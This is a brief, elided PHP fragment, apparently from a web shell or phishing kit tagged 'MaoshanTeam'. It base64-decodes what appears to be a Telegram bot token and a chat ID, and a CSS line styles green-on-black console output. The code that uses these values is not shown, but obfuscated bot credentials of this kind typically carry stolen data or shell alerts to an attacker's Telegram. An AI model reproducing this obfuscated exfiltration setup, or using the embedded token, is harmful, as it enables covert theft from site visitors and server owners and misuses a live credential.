...
$k='MaoshanTeam';
$tk = base64_decode(
    "ODM2ODE0OTMxOTpBQUVuU3A0amxQTkg2bEdnNGhZS2JWSGdfLUdGamdxNU00Yw=="
);
$cid = base64_decode("MjA3NDA4NTA5Mg==");
...
.s{color:#ffffff}.m{background:#000000;padding:8px;border-radius:4px;margin-bottom:8px;color:#0dff00}
